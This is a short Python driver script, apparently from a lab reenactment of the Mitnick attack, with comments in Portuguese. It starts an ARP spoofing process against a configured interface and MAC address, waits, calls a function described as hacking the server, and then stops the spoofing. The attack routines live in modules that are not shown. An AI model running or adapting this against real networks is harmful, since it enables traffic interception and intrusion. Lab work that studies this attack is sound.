import mitnick
import multiprocessing
import time
import configs_pc




def main():
   interface = configs_pc.interface()
   end_mac = configs_pc.end_mac()
   configs_pc.arp_s() 
 
   #ARPSPOOF
   ThreadArp = multiprocessing.Process(target=mitnick.arp_spoofing, args=(interface, end_mac))
   ThreadArp.start()
   #dorme para garantir que as tabelas de IP já estejam preparadas
   time.sleep(1.0)
   # Hackeia o servidor
   mitnick.invade(interface)
   ThreadArp.terminate()

if __name__ == "__main__":
    main()

